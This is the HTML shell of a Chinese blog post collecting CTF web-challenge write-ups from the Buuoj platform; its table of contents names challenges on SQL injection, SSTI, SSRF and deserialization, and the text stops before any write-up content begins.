<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#000000"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>Buuoj WEB Write-up | Err0r的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
  [".post-card",".markdown-body img",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#000000"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"浅伴独蓝的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"想要搜些什么？","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false,"src":"/js/search/local-search.js"},"waline":{"config":{"enable":true,"serverURL":"https://comments-err0rcm.vercel.app","comment":true,"visitor":false,"emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Err0r的小站" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="by:gyy 刷题，buuoj记录">
<meta property="og:type" content="article">
<meta property="og:title" content="Buuoj WEB Write-up">
<meta property="og:url" content="https://err0r.top/article/Buuoj-WEB-Write-up/index.html">
<meta property="og:site_name" content="Err0r的小站">
<meta property="og:description" content="by:gyy 刷题，buuoj记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129165730787.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129165825648.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129170225902.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129170548925.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129170732360.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129174627993.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129174747409.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129175323407.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129175427470.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129175938047.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129181046007.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129181142945.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129181539620.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129183233275.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129184300244.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129184626939.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129184942098.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129185017278.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129203609192.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129203656135.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129203815847.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129203901945.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129211243615.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129211356792.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129212543344.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129212613725.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129212720648.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129212856576.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129213023625.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129213121552.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202104315913.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202104343337.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202104718292.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202104751986.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202105153401.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202105351447.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202105230126.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202110359111.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202110529783.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202112853423.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202112804610.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202112928978.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202110930572.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202113058557.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202113123832.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202113806290.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202114112390.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202114324916.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202114435825.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201202114303580.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203151206446.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203151245517.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203151428059.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203151803538.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203152651182.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203152715211.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203161427723.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203161504788.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201203161829593.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208175741483.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208180232236.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208180450678.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208180558946.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208180825474.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208184745868.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208190824314.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208190921276.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208184653935.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208193014462.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208193048924.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208193135957.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208193533711.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208195802041.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208195922474.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208200037696.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208202421537.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208203755631.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208205457822.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208205704606.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208205956327.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208210427209.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201208211502701.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210190510038.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210190602388.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210191635044.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210192034277.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210192305790.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210192428939.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210194805424.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201210195920865.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201213144912657.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201213145018456.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201213145633846.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201213173543614.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201213173634852.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201213175809048.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201218135255308.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201218135449017.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201218135521199.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201218135543020.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201218135722862.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223182110711.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223182233706.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223182323977.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223182749451.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223182807801.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223184447546.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223184856356.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223185801498.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223193659732.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223203540497.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223201810099.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223203506275.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223203606551.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223203616701.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223204451913.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223204754524.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223205134946.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223210658137.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223211015299.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223211725414.png">
<meta property="og:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201223211919615.png">
<meta property="article:published_time" content="2020-10-20T09:25:50.000Z">
<meta property="article:modified_time" content="2020-12-11T03:22:50.000Z">
<meta property="article:author" content="Err0r">
<meta property="article:tag" content="SQL">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="JAVA">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://err0r.top/article/Buuoj-WEB-Write-up/image-20201129165730787.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0r的小站</a><sub class="site-subtitle">gyy</sub><div class="site-description">学的越多，越觉得自己渺小</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">44</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ MTkwNjk2ODc2NA==" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Err0rCM" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/8408670" title="哔哩哔哩" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:err0rcm@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link/" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-send-plane-2-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们|友情链接" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSAWQual-2016-i-got-id"><span class="toc-number">1.</span> <span class="toc-text">[CSAWQual 2016]i_got_id</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#perlparam-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">perlparam()任意文件读取</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DDCTF-2019-homebrew-event-loop"><span class="toc-number">2.</span> <span class="toc-text">[DDCTF 2019]homebrew event loop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">3.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N1CTF-2018-eating-cms"><span class="toc-number">4.</span> <span class="toc-text">[N1CTF 2018]eating_cms</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-parse-url%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">利用 parse_url解析漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">文件名代码执行漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web"><span class="toc-number">5.</span> <span class="toc-text">[Black Watch 入群题]Web</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">布尔盲注</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">6.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.0.0.1.</span> <span class="toc-text">文件上传</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RoarCTF-2019-Easy-Java"><span class="toc-number">7.</span> <span class="toc-text">[RoarCTF 2019]Easy Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">8.</span> <span class="toc-text">[BUUCTF 2018]Online Tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">9.</span> <span class="toc-text">[GKCTF2020]cve版签到</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2020-7066"><span class="toc-number">9.0.0.1.</span> <span class="toc-text">cve-2020-7066</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">10.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-old-hack"><span class="toc-number">11.</span> <span class="toc-text">[BJDCTF 2nd]old-hack</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#thinkphp5-0-23-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.0.0.1.</span> <span class="toc-text">thinkphp5.0.23 远程代码执行 漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">12.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">13.</span> <span class="toc-text">[BJDCTF 2nd]假猪套天下第一</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Http-Header"><span class="toc-number">13.0.0.1.</span> <span class="toc-text">Http Header</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">14.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">14.0.0.1.</span> <span class="toc-text">SSTI模板注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPU2019-Web1"><span class="toc-number">15.</span> <span class="toc-text">[SWPU2019]Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">15.0.0.1.</span> <span class="toc-text">无列名注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-Ezpop"><span class="toc-number">16.</span> <span class="toc-text">[MRCTF2020]Ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">16.0.0.1.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#pop%E9%93%BE"><span class="toc-number">16.0.0.1.1.</span> <span class="toc-text">pop链</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb"><span class="toc-number">17.</span> <span class="toc-text">[GKCTF2020]EZ三剑客-EzWeb</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF"><span class="toc-number">17.0.0.1.</span> <span class="toc-text">SSRF</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">18.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#000000;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/Buuoj-WEB-Write-up/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Buuoj WEB Write-up</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2020-10-20 17:25:50" itemprop="dateCreated datePublished" datetime="2020-10-20T17:25:50+08:00">2020-10-20</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2020-12-11 11:22:50" itemprop="dateModified" datetime="2020-12-11T11:22:50+08:00">2020-12-11</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">8.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">41m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/article/Buuoj-WEB-Write-up/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Write-Up/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Write-Up</span></a></span></span></div></div></header><section class="post-body" 